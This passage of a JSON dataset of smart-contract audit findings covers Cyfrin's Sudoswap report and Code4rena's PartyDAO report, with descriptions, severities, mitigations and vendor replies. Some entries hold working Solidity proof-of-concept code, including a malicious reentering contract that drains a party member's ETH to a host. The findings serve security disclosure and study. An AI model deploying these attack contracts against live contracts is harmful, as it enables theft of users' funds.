      "summary": "\nA vulnerability has been discovered in the `VeryFastRouter::swap` function in the new Sudoswap router, which allows an attacker to steal the original caller's funds. The vulnerability occurs when a user calls the `VeryFastRouter::swap` function to sell some NFTs and pass in some additional ETH value for subsequent buy orders. The attacker can re-enter this function under certain conditions and manipulate the return values of `LSSVMPair::swapNFTsForToken` and `LSSVMPair::swapTokenForSpecificNFTs`, which interferes with internal accounting. This allows the attacker to make it appear that a buy/sell order input/output more/less value than expected, allowing them to make away with the user's funds. \n\nThe attacker can also exploit the vulnerability if the caller specifies the router contract as their token recipient, allowing them to steal intermediate balances. The vulnerability also affects ETH value sent with ERC-20-based swaps due to user misconfiguration if the attacker is a malicious royalty recipient.\n\nThe severity of this vulnerability is rated HIGH due to the high impact and medium likelihood of the resulting loss of user funds. To mitigate this vulnerability, it is recommended to validate user inputs to `VeryFastRouter::swap`, in particular pairs, and consider making this function non-reentrant. Sudoswap and Cyfrin have acknowledged the vulnerability and no change has been made yet as the risk surface is set to callers passing in improper arguments.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18411",
      "title": "Specified `minOutput` will remain locked in `LSSVMRouter::swapNFTsForSpecificNFTsThroughETH`",
      "impact": "HIGH",
      "content": "**Description:**\nThe Cyfrin team understands that `LSSVMRouter` is slightly out of scope for this audit, given that it is intended to be deprecated and replaced by `VeryFastRouter`; however, a slightly modified version of this contract is currently deployed and [live on mainnet](https://etherscan.io/address/0x2b2e8cda09bba9660dca5cb6233787738ad68329#code). We have found a bug in [`LSSVMRouter::swapNFTsForSpecificNFTsThroughETH`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L88) and `LSSVMRouter::swapNFTsForAnyNFTsThroughETH` which has been validated against a mainnet fork to lock user funds sent with the function call as specified by the [`minOutput`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L90) parameter. In other words, users attempting to protect themselves from slippage will find that this causes their funds to become locked - the higher the minimum expected output specified, the higher value of funds locked.\n\nUsers specifying a non-zero `minOutput` value will have this amount [deducted](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L105) from the `inputAmount` sent on the second half of the swap, from ETH to NFTs, handled by the internal functions [`LSSVMRouter::_swapETHForSpecificNFTs`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L560) and `LSSVMRouter::_swapETHForAnyNFTs`. Given that it is the responsibility of these internal functions to issue a refund of any unspent ETH based on this [`inputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L562) parameter, the excess value represented by `minOutput` is not included in the [`remainingValue`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L566) [calculation](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L582) and so will not be included in the subsequent [ETH transfer](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L591-L595). If there are no intermediate underflows (due to a sufficiently large value of `minOutput`) then any excess ETH as specified by `minOutput` will therefore remain locked in the router forever.\n\nFortunately, it appears these functions have never actually been called on the mainnet deployment as they have not been connected to the Sudoswap front end. While Sudoswap doesn't use these functions on the client, contract-level integrators may find themselves with potentially lost funds, so the Sudorandom Labs team has attempted to reach out to those potentially affected.\n\n**Proof of Concept:**\nApply the following git diff:\n\n```diff\ndiff --git a/src/test/interfaces/ILSSVMPairFactoryMainnet.sol b/src/test/interfaces/ILSSVMPairFactoryMainnet.sol\nnew file mode 100644\nindex 0000000..3cdea5b\n--- /dev/null\n+++ b/src/test/interfaces/ILSSVMPairFactoryMainnet.sol\n@@ -0,0 +1,20 @@\n+// SPDX-License-Identifier: MIT\n+pragma solidity ^0.8.0;\n+\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {LSSVMPairETH} from \"../../LSSVMPairETH.sol\";\n+\n+interface ILSSVMPairFactoryMainnet {\n+    function createPairETH(\n+        IERC721 _nft,\n+        ICurve _bondingCurve,\n+        address payable _assetRecipient,\n+        LSSVMPair.PoolType _poolType,\n+        uint128 _delta,\n+        uint96 _fee,\n+        uint128 _spotPrice,\n+        uint256[] calldata _initialNFTIDs\n+    ) external payable returns (LSSVMPairETH pair);\n+}\ndiff --git a/src/test/mixins/UsingETH.sol b/src/test/mixins/UsingETH.sol\nindex 0e5cb40..8fecb1e 100644\n--- a/src/test/mixins/UsingETH.sol\n+++ b/src/test/mixins/UsingETH.sol\n@@ -14,6 +14,8 @@ import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n import {LSSVMPairERC721} from \"../../erc721/LSSVMPairERC721.sol\";\n import {LSSVMPairERC1155} from \"../../erc1155/LSSVMPairERC1155.sol\";\n\n+import {ILSSVMPairFactoryMainnet} from \"../interfaces/ILSSVMPairFactoryMainnet.sol\";\n+\n abstract contract UsingETH is Configurable, RouterCaller {\n     function modifyInputAmount(uint256 inputAmount) public pure override returns (uint256) {\n         return inputAmount;\n@@ -46,6 +48,25 @@ abstract contract UsingETH is Configurable, RouterCaller {\n         return pair;\n     }\n\n+    function setupPairERC721Mainnet(\n+        ILSSVMPairFactoryMainnet factory,\n+        IERC721 nft,\n+        ICurve bondingCurve,\n+        address payable assetRecipient,\n+        LSSVMPair.PoolType poolType,\n+        uint128 delta,\n+        uint96 fee,\n+        uint128 spotPrice,\n+        uint256[] memory _idList,\n+        uint256,\n+        address\n+    ) public payable returns (LSSVMPair) {\n+        LSSVMPairETH pair = factory.createPairETH{value: msg.value}(\n+            nft, bondingCurve, assetRecipient, poolType, delta, fee, spotPrice, _idList\n+        );\n+        return pair;\n+    }\n+\n     function setupPairERC1155(CreateERC1155PairParams memory params) public payable override returns (LSSVMPair) {\n         LSSVMPairETH pair = params.factory.createPairERC1155ETH{value: msg.value}(\n             params.nft,\ndiff --git a/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol b/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol\nnew file mode 100644\nindex 0000000..596da45\n--- /dev/null\n+++ b/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol\n@@ -0,0 +1,114 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import \"forge-std/Test.sol\";\n+\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {Test721} from \"../../mocks/Test721.sol\";\n+\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+import {ILSSVMPairFactoryMainnet} from \"../interfaces/ILSSVMPairFactoryMainnet.sol\";\n+\n+import {UsingETH} from \"../mixins/UsingETH.sol\";\n+import {ConfigurableWithRoyalties} from \"../mixins/ConfigurableWithRoyalties.sol\";\n+import {LinearCurve, UsingLinearCurve} from \"../../test/mixins/UsingLinearCurve.sol\";\n+\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {LSSVMPairETH} from \"../../LSSVMPairETH.sol\";\n+import {LSSVMRouter} from \"../../LSSVMRouter.sol\";\n+import {RoyaltyEngine} from \"../../RoyaltyEngine.sol\";\n+import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n+\n+\n+contract CyfrinLSSVMRouterPoC is Test, ConfigurableWithRoyalties, UsingLinearCurve, UsingETH {\n+    IERC721 test721;\n+    address payable alice;\n+\n+    LSSVMRouter constant LSSVM_ROUTER = LSSVMRouter(payable(address(0x2B2e8cDA09bBA9660dCA5cB6233787738Ad68329)));\n+    LSSVMPairFactory constant LSSVM_PAIR_FACTORY = LSSVMPairFactory(payable(address(0xb16c1342E617A5B6E4b631EB114483FDB289c0A4)));\n+    LinearCurve constant LINEAR_CURVE = LinearCurve(payable(address(0x5B6aC51d9B1CeDE0068a1B26533CAce807f883Ee)));\n+\n+    function setUp() public {\n+        vm.createSelectFork(vm.envOr(\"MAINNET_RPC_URL\", string.concat(\"https://rpc.ankr.com/eth\")));\n+\n+        test721 = setup721();\n+        alice = payable(makeAddr(\"alice\"));\n+        deal(alice, 1 ether);\n+    }\n+\n+    function test_minOutputIsLockedInRouterWhenCallingswapNFTsForSpecificNFTsThroughETH() public {\n+        Test721(address(test721)).mint(alice, 1);\n+        uint256[] memory nftToTokenTradesIds = new uint256[](1);\n+        nftToTokenTradesIds[0] = 1;\n+        Test721(address(test721)).mint(address(this), 2);\n+        Test721(address(test721)).mint(address(this), 3);\n+        Test721(address(test721)).mint(address(this), 4);\n+        uint256[] memory ids = new uint256[](3);\n+        ids[0] = 2;\n+        ids[1] = 3;\n+        ids[2] = 4;\n+        uint256[] memory tokenToNFTTradesIds = new uint256[](1);\n+        tokenToNFTTradesIds[0] = ids[ids.length - 1];\n+\n+        test721.setApprovalForAll(address(LSSVM_PAIR_FACTORY), true);\n+        LSSVMPair pair721 = this.setupPairERC721Mainnet{value: 10 ether}(\n+            ILSSVMPairFactoryMainnet(address(LSSVM_PAIR_FACTORY)),\n+            test721,\n+            LINEAR_CURVE,\n+            payable(address(0)),\n+            LSSVMPair.PoolType.TRADE,\n+            0.1 ether, // delta\n+            0.1 ether, // 10% for trade fee\n+            1 ether, // spot price\n+            ids,\n+            10 ether,\n+            address(0)\n+        );\n+\n+        uint256 pairETHBalanceBefore = address(pair721).balance;\n+        uint256 aliceETHBalanceBefore = address(alice).balance;\n+        uint256 routerETHBalanceBefore = address(LSSVM_ROUTER).balance;\n+\n+        emit log_named_uint(\"pairETHBalanceBefore\", pairETHBalanceBefore);\n+        emit log_named_uint(\"aliceETHBalanceBefore\", aliceETHBalanceBefore);\n+        emit log_named_uint(\"routerETHBalanceBefore\", routerETHBalanceBefore);\n+\n+        uint256 minOutput;\n+        {\n+            LSSVMRouter.PairSwapSpecific[] memory nftToTokenTrades = new LSSVMRouter.PairSwapSpecific[](1);\n+            nftToTokenTrades[0] = LSSVMRouter.PairSwapSpecific({\n+                pair: pair721,\n+                nftIds: nftToTokenTradesIds\n+            });\n+\n+            LSSVMRouter.PairSwapSpecific[] memory tokenToNFTTrades = new LSSVMRouter.PairSwapSpecific[](1);\n+            tokenToNFTTrades[0] = LSSVMRouter.PairSwapSpecific({\n+                pair: pair721,\n+                nftIds: tokenToNFTTradesIds\n+            });\n+\n+            LSSVMRouter.NFTsForSpecificNFTsTrade memory trade = LSSVMRouter.NFTsForSpecificNFTsTrade({\n+                nftToTokenTrades: nftToTokenTrades,\n+                tokenToNFTTrades: tokenToNFTTrades\n+            });\n+\n+\n+            vm.startPrank(alice);\n+            test721.setApprovalForAll(address(LSSVM_ROUTER), true);\n+            minOutput = 0.79 ether;\n+            LSSVM_ROUTER.swapNFTsForSpecificNFTsThroughETH{value: 1 ether}(trade, minOutput, alice, alice, block.timestamp + 10);\n+        }\n+\n+        uint256 pairETHBalanceAfter = address(pair721).balance;\n+        uint256 aliceETHBalanceAfter = address(alice).balance;\n+        uint256 routerETHBalanceAfter = address(LSSVM_ROUTER).balance;\n+\n+        assertTrue(test721.ownerOf(tokenToNFTTradesIds[0]) == alice);\n+        assertGt(pairETHBalanceAfter, pairETHBalanceBefore);\n+        assertEq(routerETHBalanceAfter, minOutput);\n+\n+        emit log_named_uint(\"pairETHBalanceAfter\", pairETHBalanceAfter);\n+        emit log_named_uint(\"aliceETHBalanceAfter\", aliceETHBalanceAfter);\n+        emit log_named_uint(\"routerETHBalanceAfter\", routerETHBalanceAfter);\n+    }\n+}\n```\n\n**Impact:**\nThis vulnerability results in the locking of user funds with high impact and likelihood. If the problematic functions were integrated into a UI, then this would be evaluated as CRITICAL, but given that the current integrations significantly reduce the likelihood, we evaluate the severity as HIGH.\n\n**Recommended Mitigation:**\nPass `minOutput` through to the internal functions to be used in refund calculations and correctly reflect the true contract balance, validating that this amount is not exceeded. This way, the [`outputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L94) [return value](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L104-L106) will correctly reflect the excess ETH transferred to the caller.\n\n**Sudoswap:**\nAcknowledged. This issue is present in current implementation of the Router, but no UIs are currently integrated to interact with this specific function. The contract is expected to be deprecated soon in favour of the VeryFastRouter.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "\nThe Cyfrin team has identified a bug in the `LSSVMRouter` contract that is currently live on mainnet. This bug affects the functions `LSSVMRouter::swapNFTsForSpecificNFTsThroughETH` and `LSSVMRouter::swapNFTsForAnyNFTsThroughETH`, which are used to swap non-fungible tokens (NFTs) for ETH. If a user specifies a non-zero `minOutput` value, this amount will be deducted from the `inputAmount` sent on the second half of the swap, from ETH to NFTs. This means that the excess value represented by `minOutput` is not included in the refund calculation, and so will not be included in the subsequent ETH transfer. As a result, any excess ETH as specified by `minOutput` will remain locked in the router forever.\n\nFortunately, these functions have never actually been called on the mainnet deployment as they have not been connected to the Sudoswap front end. While Sudoswap doesn't use these functions on the client, contract-level integrators may find themselves with potentially lost funds, so the Sudorandom Labs team has attempted to reach out to those potentially affected.\n\nThis vulnerability has high impact and likelihood, but is not considered critical as the current integrations significantly reduce the likelihood. The recommended mitigation is to pass `minOutput` through to the internal functions to be used in refund calculations and correctly reflect the true contract balance. This way, the `outputAmount` return value will correctly reflect the excess ETH transferred to the caller.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "20149",
      "title": "[R-01] Use `VETO_VALUE` for clarity",
      "impact": "LOW",
      "content": "https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernance.sol#L1024-L1027\n\nReplace `type(uint96).max` in the above code with `VETO_VALUE` for clarity and easier refactoring in the future.\n\n**[0xble (Party) acknowledged](https://github.com/code-423n4/2023-05-party-findings/issues/5#issuecomment-1572304200)**\n\n**[cccz (judge) commented](https://github.com/code-423n4/2023-05-party-findings/issues/5#issuecomment-1573187891):**\n > L-2 is more like a GAS.<br>\n> The warden's QA submission has the highest score, selected as the best.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20148",
      "title": "[L-04] Host shouldn't be able to disable emergencyExecute",
      "impact": "LOW",
      "content": "https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernance.sol#L816-L819\n\nEmergency execute is a protective measure so that the PartyDAO can execute any arbitrary function as the Party contract and move assets. This is useful when the Party contract is in a bad state and assets are stuck. This gives Party members a chance to recover their stuck assets. Given this, allowing any Host to `disableEmergencyExecute()` seems like too much power for the role and requires that the Host role is highly trusted. Furthermore, disabling emergency execute is permanent and irreversible. May be worth considering giving activeMembers the ability to disable and enable emergencyExecute.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20147",
      "title": "[L-03] `transferEth()` should not copy returnData",
      "impact": "LOW",
      "content": "https://github.com/code-423n4/2023-05-party/blob/main/contracts/utils/LibAddress.sol#L112-L14\n\nWe only care about transferring ETH in the `transferEth()` function and we do not do anything to the returnData. This also prevents any reverts caused by lacking gas due to large return data causing memory expansion which can be the case if the address receiving ether is a contract with a `fallback()` function that returns data and no `receive()` function. [This assembly block](https://github.com/ethereum-optimism/optimism/blob/develop/packages/contracts-bedrock/contracts/libraries/SafeCall.sol#L52-L62) can be used in place of the `receiver.call{}()` code. It works the same but does not assign memory to any returnData.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20146",
      "title": "[L-02] `getDistributionShareOf()` does not need to check that `totalVotingPower` == 0 in `rageQuit()`",
      "impact": "LOW",
      "content": "https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L151-L154\n\n`getDistributionShareOf()` is only used in [`PartyGovernanceNFT.rageQuit()`](https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L316). There is no point in rage quitting while `totalVotingPower` is 0 because a user will not be able to withdraw their assets, and then later `burn()` call will fail anyway. So `getDistributionShareOf()` should instead remove the check for `totalVotingPower == 0` and fail with a divisionByZero error. In that way, the function fails earlier and wastes less gas and does not rely on `burn()` reverting when totalVotingPower is 0.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20145",
      "title": "[L-01] Validate rageQuitTimestamp in `PartyGovernanceNFT._initialize()`",
      "impact": "LOW",
      "content": "https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L101\n\n`rageQuit()` is a valuable feature for Party members since it is a protective measure for them to be able to do an emergency withdrawal of their assets. Given that, it would be a good and sane default for `rageQuitTimestamp` to be initialized to some value in the future so that Party members are assured they can rageQuit in the early stages of the Party.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20144",
      "title": "[M-07] Users can bypass distributions fees by ragequitting instead of using a formal distribution",
      "impact": "MEDIUM",
      "content": "\nDistribution fees can be bypassed by ragequitting instead of distributing\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/party/PartyGovernance.sol#L510-L515>\n\n        address payable feeRecipient_ = feeRecipient;\n        uint16 feeBps_ = feeBps;\n        if (tokenType == ITokenDistributor.TokenType.Native) {\n            return\n                distributor.createNativeDistribution{ value: amount }(this, feeRecipient_, feeBps_);\n        }\n\nWhen a distribution is created the distribution will pay fees to the `feeRecipient`.\n\n<https://github.com/code-423n4/2023-05-party/blob/f6f80dde81d86e397ba4f3dedb561e23d58ec884/contracts/party/PartyGovernanceNFT.sol#L333-L345>\n\n                if (address(token) == ETH_ADDRESS) {\n                    // Transfer fair share of ETH to receiver.\n                    uint256 amount = (address(this).balance * shareOfVotingPower) / 1e18;\n                    if (amount != 0) {\n                        payable(receiver).transferEth(amount);\n                    }\n                } else {\n                    // Transfer fair share of tokens to receiver.\n                    uint256 amount = (token.balanceOf(address(this)) * shareOfVotingPower) / 1e18;\n                    if (amount != 0) {\n                        token.compatTransfer(receiver, amount);\n                    }\n                }\n\nOn the other hand, when a user rage quits, they are given the full amount without any fees being taken. If we assume that the party is winding down, then users can bypass this fee by rage quitting instead of using a formal distribution. This creates value leakage and the fee recipient is not being paid the fees they would otherwise be due.\n\n### Recommended Mitigation Steps\n\nCharge distribution fees when rage quitting\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-05-party-findings/issues/12#issuecomment-1569148860):**\n > Fair to bring up, although based on how parties will be configured when created through our frontend, rage quitting and distributions will be mutually exclusive.\n\n***\n\n",
      "summary": "\nThis bug report concerns a bug in the code of the Party Governance contract. The bug allows users to bypass distribution fees by rage quitting instead of using a formal distribution. This creates value leakage and the fee recipient is not being paid the fees they would otherwise be due. The code for this bug can be found in the Party Governance.sol and Party GovernanceNFT.sol files. \n\nTo mitigate this bug, it is recommended that distribution fees be charged when rage quitting. This has been confirmed and commented on by 0xble (Party) who stated that based on how parties will be configured when created through their frontend, rage quitting and distributions will be mutually exclusive.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "https://github.com/code-423n4/2023-05-party-findings/issues/12",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "20143",
      "title": "[M-06] Reentrancy guard in `rageQuit()` can be bypassed",
      "impact": "MEDIUM",
      "content": "\nThe reentrancy guard present in the `rageQuit()` function can be bypassed by host accounts, leading to reentrancy attack vectors and loss of funds.\n\nThe new `rageQuit()` function can be used by party members to exit their position and obtain their share of the tokens held by the party contract. In order to prevent function reentrancy while sending ETH or transferring ERC20 tokens, the implementation reuses the `rageQuitTimestamp` variable as a guard to check if the function is being called again while executing.\n\n<https://github.com/code-423n4/2023-05-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L293-L353>\n\n```solidity\n293:     function rageQuit(\n294:         uint256[] calldata tokenIds,\n295:         IERC20[] calldata withdrawTokens,\n296:         address receiver\n297:     ) external {\n298:         // Check if ragequit is allowed.\n299:         uint40 currentRageQuitTimestamp = rageQuitTimestamp;\n300:         if (currentRageQuitTimestamp != ENABLE_RAGEQUIT_PERMANENTLY) {\n301:             if (\n302:                 currentRageQuitTimestamp == DISABLE_RAGEQUIT_PERMANENTLY ||\n303:                 currentRageQuitTimestamp < block.timestamp\n304:             ) {\n305:                 revert CannotRageQuitError(currentRageQuitTimestamp);\n306:             }\n307:         }\n308: \n309:         // Used as a reentrancy guard. Will be updated back after ragequit.\n310:         delete rageQuitTimestamp;\n             \n             ...\n             \n349:         // Update ragequit timestamp back to before.\n350:         rageQuitTimestamp = currentRageQuitTimestamp;\n351: \n352:         emit RageQuit(tokenIds, withdrawTokens, receiver);\n353:     }\n```\n\nThe implementation deletes the value of `rageQuitTimestamp` (which sets it to zero) in line 310. The intention is to use this variable to prevent reentrancy, as setting it to zero will block any call due to the check in line 303, `block.timestamp` will be greater than zero and will lead to the revert in line 305. After NFTs are burned and tokens are transferred, the function restores the original value in line 350.\n\nThis reentrancy guard can still be bypassed using `setRageQuit()`. If execution control is transferred to the attacker, then the attacker can call `setRageQuit()` to reset the value to anything greater than `block.timestamp`, allowing the reentrancy on the `rageQuit()` function. Note that this would require the attacker to be a party host or be in complicity with a party host.\n\nThe general scenario to trigger the reentrancy is as follows:\n\n1.  User calls `rageQuit()`.\n2.  ETH or ERC20 transfers control to the attacker. This can be in different forms:\n    *   ETH transfers to contracts that invoke the `receive()` or `fallback()` function.\n    *   Variations of the ERC20 tokens that have callbacks during transfers (e.g. ERC777)\n    *   Poisoned ERC20 implementation that receives control during the `transfer()` call itself.\n3.  Attacker resets the `rageQuitTimestamp` by calling `setRageQuit(block.timestamp + 1)`.\n4.  Attacker reenters the `rageQuit()` function.\n\nThe issue can be exploited to disable the reentrancy guard in the `rageQuit()` function, leading to further attacks. We will explore a scenario of potential loss of funds in the next section.\n\n### Proof of Concept\n\nThe following is an adaptation of the test `testRageQuit_cannotReenter()` present in the PartyGovernanceNFT.t.sol test suite, with minimal variations to enable the described attack.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/9a9868c7c3f540811eff6853db14bfc6).\n\n```solidity\nfunction test_PartyGovernanceNFT_ReentrancyAttack() external {\n   address alice = makeAddr(\"alice\");\n   address host = makeAddr(\"host\");\n\n   (Party party, , ) = partyAdmin.createParty(\n      partyImpl,\n      PartyAdmin.PartyCreationMinimalOptions({\n            host1: address(this),\n            host2: host,\n            passThresholdBps: 5100,\n            totalVotingPower: 100,\n            preciousTokenAddress: address(toadz),\n            preciousTokenId: 1,\n            rageQuitTimestamp: 0,\n            feeBps: 0,\n            feeRecipient: payable(0)\n      })\n   );\n\n   vm.prank(address(this));\n   party.setRageQuit(uint40(block.timestamp) + 1);\n\n   // Mint voting NFTs, alice and host have both 50%\n   vm.prank(address(partyAdmin));\n   uint256 aliceTokenId = party.mint(alice, 50, alice);\n   vm.prank(address(partyAdmin));\n   uint256 hostTokenId = party.mint(host, 50, host);\n\n   // Host (attacker) deploys malicious ReenteringContract\n   ReenteringContract reenteringContract = new ReenteringContract(party, hostTokenId, host);\n\n   // Host sends his NFT to the contract\n   vm.prank(host);\n   party.transferFrom(host, address(reenteringContract), hostTokenId);\n\n   // Host transfer host feature to contract\n   vm.prank(host);\n   party.abdicateHost(address(reenteringContract));\n\n   // Simulate there is 1 ETH in the party\n   vm.deal(address(party), 1 ether);\n\n   // Alice decides to rage quit\n\n   IERC20[] memory tokens = new IERC20[](2);\n   tokens[0] = IERC20(address(reenteringContract));\n   tokens[1] = IERC20(ETH_ADDRESS);\n\n   uint256[] memory tokenIds = new uint256[](1);\n   tokenIds[0] = aliceTokenId;\n\n   vm.prank(alice);\n   party.rageQuit(tokenIds, tokens, alice);\n\n   // Alice has 0 ETH while the host (attacker) has all the funds\n   assertEq(alice.balance, 0);\n   assertEq(host.balance, 1 ether);\n}\n\ncontract ReenteringContract is ERC721Receiver {\n    Party party;\n    uint256 tokenId;\n    address attacker;\n\n    constructor(Party _party, uint256 _tokenId, address _attacker) {\n        party = _party;\n        tokenId = _tokenId;\n        attacker = _attacker;\n    }\n\n    function balanceOf(address) external returns (uint256) {\n        return 1337;\n    }\n\n    function transfer(address, uint256) external returns (bool) {\n        // Disable reentrancy guard\n        party.setRageQuit(uint40(block.timestamp + 1));\n\n        // Return host to attacker\n        party.abdicateHost(attacker);\n\n        // Execute attack\n        IERC20[] memory tokens = new IERC20[](1);\n        tokens[0] = IERC20(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n        uint256[] memory tokenIds = new uint256[](1);\n        tokenIds[0] = tokenId;\n        party.rageQuit(tokenIds, tokens, address(this));\n        return true;\n    }\n\n    fallback() external payable {\n        // sends funds to attacker\n        payable(attacker).transfer(address(this).balance);\n    }\n}\n```\n\n### Recommendation\n\nImplement a reentrancy guard using a dedicated variable that acts as the flag, such as the one available in the [OpenZeppelin contracts library](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard).\n\nAlternatively, if the intention is to reuse the same `rageQuitTimestamp` variable, set it temporarily to  `DISABLE_RAGEQUIT_PERMANENTLY` instead of zero. This will prevent calling `setRageQuit()` to reset the `rageQuitTimestamp` variable while also blocking calls to `rageQuit()`.\n\n### Assessed type\n\nReentrancy\n\n**[cccz (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-05-party-findings/issues/13#issuecomment-1569494102):**\n > This attack scenario requires the victim to add malicious ERC20 tokens to the withdrawTokens parameter, and since this is not directly compromising user assets (which requires certain external requirements), consider M.\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-05-party-findings/issues/13#issuecomment-1572312651)**\n\n*Note: for full discussion, see [here](https://github.com/code-423n4/2023-05-party-findings/issues/13).*\n\n***\n\n",
      "summary": "\nThe `rageQuit()` function in the PartyGovernanceNFT contract allows party members to exit their position and obtain their share of the tokens held by the party contract. To prevent function reentrancy while sending ETH or transferring ERC20 tokens, the implementation uses the `rageQuitTimestamp` variable as a guard to check if the function is being called again while executing. However, a bug in the implementation allows the reentrancy guard to be bypassed by host accounts, leading to reentrancy attack vectors and loss of funds. \n\nThe `rageQuitTimestamp` variable is set to zero in line 310, which blocks any call due to the check in line 303, `block.timestamp` will be greater than zero and will lead to the revert in line 305. After NFTs are burned and tokens are transferred, the function restores the original value in line 350. This allows an attacker to call `setRageQuit()` to reset the value to anything greater than `block.timestamp`, allowing the reentrancy on the `rageQuit()` function. \n\nThe general scenario to trigger the reentrancy is as follows: \n1. User calls `rageQuit()`.\n2. ETH or ERC20 transfers control to the attacker. \n3. Attacker resets the `rageQuitTimestamp` by calling `setRageQuit(block.timestamp + 1)`.\n4. Attacker reenters the `rageQuit()` function.\n\nThe issue can be exploited to disable the reentrancy guard in the `rageQuit()` function, leading to further attacks. To mitigate this issue, it is recommended to implement a reentrancy guard using a dedicated variable that acts as the flag, such as the one available in the OpenZeppelin contracts library. Alternatively, the `rageQuitTimestamp` variable can be temporarily set to `DISABLE_RAGEQUIT_PERMANENTLY` instead of zero. This will prevent calling `setRageQuit()` to reset the `rageQuitTimestamp` variable while also blocking calls to `rageQuit()`.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-05-party",
      "github_link": "https://github.com/code-423n4/2023-05-party-findings/issues/13",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "d3e4",
        "0x52",
        "gjaldon",
        "hansfriese",
        "adriro"
      ]
    },
    {
      "id": "20142",
